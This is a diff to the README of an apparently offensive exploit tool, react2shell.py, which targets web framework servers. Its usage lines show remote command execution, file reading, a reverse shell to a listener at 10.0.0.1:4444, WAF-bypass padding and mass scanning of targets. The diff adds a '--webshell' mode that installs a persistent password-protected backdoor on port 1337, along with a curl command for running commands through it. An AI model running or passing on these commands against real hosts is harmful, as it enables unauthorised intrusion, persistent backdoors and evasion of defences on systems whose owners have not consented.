@@ -56,8 +56,8 @@ python react2shell.py http://localhost:3014 -F waku -c "cat /app/flag.txt"
 ## Features
 
 ### Scanning Modes
-- **Default**: RCE proof-of-concept (math operation)
-- **Safe mode** (`-s`): Side-channel detection without code execution
+- **Safe mode** (default): Side-channel detection without code execution
+- **RCE mode** (`--rce`): Proof-of-concept with math operation
 - **Local scanning** (`-L`): Check package.json for vulnerable versions
 
 ### Execution Modes
@@ -65,6 +65,7 @@ python react2shell.py http://localhost:3014 -F waku -c "cat /app/flag.txt"
 - **Interactive shell** (`-i`): Persistent command session
 - **Reverse shell** (`-r`): Multiple shell types (nc, bash, python, etc.)
 - **File reading** (`-f`): Read remote files
+- **Webshell** (`--webshell`): Install persistent backdoor on port 1337
 
 ### WAF Bypass Options
 - **Junk data padding** (`-w`): Add padding to evade inspection limits
@@ -94,6 +95,10 @@ python react2shell.py https://target.com -i -x http://127.0.0.1:8080
 
 # Reverse shell
 python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash
+
+# Install webshell (persistent backdoor on port 1337)
+python react2shell.py https://target.com --webshell mypassword
+# Access: curl 'http://target:1337/?p=mypassword&cmd=id'
 
 # Scan multiple targets from file
 python react2shell.py targets.txt -t 20 -o results.json
